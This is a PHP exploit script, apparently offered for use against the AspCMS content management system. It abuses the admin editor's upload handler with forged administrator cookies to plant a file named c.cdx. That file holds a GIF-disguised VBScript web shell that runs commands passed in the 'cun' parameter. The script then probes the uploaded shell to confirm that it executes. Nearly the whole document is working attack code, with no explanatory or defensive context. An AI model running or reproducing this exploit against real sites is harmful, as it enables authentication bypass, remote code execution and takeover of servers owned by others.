<?
error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);
define(STDIN, fopen("php://stdin", "r"));
function http_send($host, $packet){
 $sock = fsockopen($host, 80);
if (!$sock) die("$errstr ($errno)\n");

 fputs($sock, $packet);
 while (!feof($sock)) $resp .= fread($sock, 1024);
 fclose($sock);
 //print $resp;
 return $resp;

}

function connector_response($host,$html){
preg_match('/SetEditorContents\(\'Content\',\'(.*?)\'\)/',$html,$arr);
if (strpos($arr[1],".cdx")){
print "\n[-] Get Shell: http://".$host."/".$arr[1]." \n";
Checkshell($host,$arr[1]);
}
else{
echo "\n[-] Exploit Failure \n";
}
}
if ($argc < 1)
{
print "\n+------------------------------------------------------------------+";
print "\n|                          Aspcms Exploit                          |";
print "\n+------------------------------------------------------------------+\n";
print "\nUsage......: php $argv[0] host\n";
print "\nExample....: php $argv[0] localhost\n";
print "\nExample....: php $argv[0] localhost\n";
die();
}

$host = $argv[1];

$filename= "c.cdx";
$connector = "/admin/editor/upload.asp?action=save&sortType=2&stype=image&Tobj=content&toimg=";
$payload  = "-----------------------------265001916915724\r\n";
$payload .= "Content-Disposition: form-data; name=\"filedata\"; filename=\"{$filename}\"\r\n";
$payload .= "Content-Type: text/plain\r\n\r\n";
$payload .= 'GIF89a<script language=vbs runat=server>execute(request("cun"))</script>'."\r\n".'%'.'>'."\n";
$payload .= "-----------------------------265001916915724--\r\n";
$packet  = "POST {$connector} HTTP/1.1\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Type: multipart/form-data; boundary=---------------------------265001916915724\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Cookie: username=admin; ASPSESSIONIDAABTAACS=IHDJOJACOPKFEEENHHMJHKLG; LanguageAlias=cn; LanguagePath=%2F; languageID=1; adminId=1; adminName=admin; groupMenu=1%2C+70%2C+10%2C+11%2C+12%2C+13%2C+14%2C+20%2C+68%2C+15%2C+16%2C+17%2C+18%2C+3%2C+25%2C+57%2C+58%2C+59%2C+2%2C+21%2C+22%2C+23%2C+24%2C+4%2C+27%2C+28%2C+29%2C+5%2C+49%2C+52%2C+56%2C+30%2C+51%2C+53%2C+54%2C+55%2C+188%2C+67%2C+63%2C+190%2C+184%2C+86%2C+6%2C+32%2C+33%2C+34%2C+8%2C+37%2C+183%2C+38%2C+60%2C+9; GroupName=%B3%AC%BC%B6%B9%DC%C0%ED%D4%B1%D7%E9\r\n";
$packet .= "Connection: close\r\n\r\n";
$packet .= $payload;
//print $packet;
connector_response($host,http_send($host, $packet));

function Checkshell($url,$path){
//$Shell="http://$url$path?cun=response.write+413783480"; 
$payload .= "cun=response.write+413783480\r\n";
$packet  = "POST $path?cun=response.write+413783480 HTTP/1.1\r\n";
$packet .= "Host: {$url}\r\n";
$packet .= "Content-Type: multipart/form-data; boundary=---------------------------265001916915724\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Cookie: username=admin; ASPSESSIONIDAABTAACS=IHDJOJACOPKFEEENHHMJHKLG; LanguageAlias=cn; LanguagePath=%2F; languageID=1; adminId=1; adminName=admin; groupMenu=1%2C+70%2C+10%2C+11%2C+12%2C+13%2C+14%2C+20%2C+68%2C+15%2C+16%2C+17%2C+18%2C+3%2C+25%2C+57%2C+58%2C+59%2C+2%2C+21%2C+22%2C+23%2C+24%2C+4%2C+27%2C+28%2C+29%2C+5%2C+49%2C+52%2C+56%2C+30%2C+51%2C+53%2C+54%2C+55%2C+188%2C+67%2C+63%2C+190%2C+184%2C+86%2C+6%2C+32%2C+33%2C+34%2C+8%2C+37%2C+183%2C+38%2C+60%2C+9; GroupName=%B3%AC%BC%B6%B9%DC%C0%ED%D4%B1%D7%E9\r\n";
$packet .= "Connection: close\r\n\r\n";
$packet .= $payload;
 $sock = fsockopen($url, 80);
if (!$sock) die("$errstr ($errno)\n");
 fputs($sock, $packet);
 while (!feof($sock)) $resp .= fread($sock, 1024);
 fclose($sock);
 //print $resp;
if(strpos($resp,"413783480")||strpos($resp,"execute")){
echo "[*] Shell Can Use\n" ;
}else{
echo "[*] Shell Can't Use\n";
}
}
?>